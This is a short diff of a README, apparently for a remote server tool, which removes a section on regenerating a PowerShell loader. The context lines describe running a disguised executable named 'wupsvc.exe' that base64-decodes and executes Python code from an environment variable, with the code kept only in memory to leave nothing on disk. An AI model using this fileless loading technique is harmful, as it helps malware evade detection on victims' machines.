@@ -51,14 +51,6 @@ The loader:
 3. Runs `wupsvc.exe -c "exec(base64.b64decode(os.environ['PYLOAD']))"`
 4. Code lives only in memory — nothing on disk
 
-### Method 3: Regenerate Loader
-
-```bash
-python gen_ps_loader.py serveranydusk(local).py server
-```
-
-Produces `server.ps1` + `server.cmd` with embedded server code.
-
 ## Server Commands
 
 | Feature | Command |
